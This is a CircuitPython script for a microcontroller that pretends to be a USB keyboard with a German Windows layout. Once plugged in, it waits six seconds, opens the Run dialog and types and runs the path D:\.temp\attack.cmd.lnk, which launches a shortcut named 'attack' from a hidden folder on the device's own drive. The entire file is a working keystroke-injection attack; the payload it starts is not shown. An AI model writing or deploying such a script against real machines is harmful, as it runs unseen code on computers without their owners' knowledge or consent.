import board
import digitalio
import time
import usb_hid
import os
from adafruit_hid.keyboard import Keyboard
from keyboard_layout_win_de import KeyboardLayout
from keycode_win_de import Keycode
kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayout(kbd)

time.sleep(6)

kbd.send(Keycode.WINDOWS, Keycode.R)

time.sleep(0.8)
kbd.release_all()
time.sleep(1.5)
layout.write("D:")
kbd.send(Keycode.ALTGR, Keycode.BACKSLASH)
layout.write(".temp")
kbd.send(Keycode.ALTGR, Keycode.BACKSLASH)
layout.write("attack.cmd.lnk")
kbd.press(Keycode.ENTER)
kbd.release_all()
###"D:\.temp\attack.cmd.lnk"
